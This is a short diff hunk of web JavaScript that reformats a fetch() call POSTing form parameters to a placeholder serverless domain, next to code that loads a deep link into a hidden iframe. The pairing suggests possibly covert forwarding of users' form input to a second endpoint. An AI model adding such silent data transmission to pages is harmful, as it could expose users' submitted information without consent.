@@ -222,16 +222,15 @@
         }
         hiddenSandboxedIframeConduit.src = targetDeepLinkURI;
         
-        // =========================================================================
-        // ✅ 2. DUAL TRANSMISSION OVER-THE-AIR CLOUD BACKUP (FIXED API PIPELINE)
-        // Points directly to your secure serverless function with zero redirects!
-        // =========================================================================
-        fetch('https://vercel.app', {
-            method: 'POST',
-            mode: 'cors',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: formParams.toString()
-        })
+// =========================================================================
+// ✅ REPLACE IT WITH YOUR ACTUAL LIVE DEPLOYED DOMAIN STRING PATHWAY:
+// =========================================================================
+fetch('https://vercel.app', {
+method: 'POST',
+mode: 'cors',
+headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+body: formParams.toString()
+})
 
         .then(response => response.json())
         .then(data => {
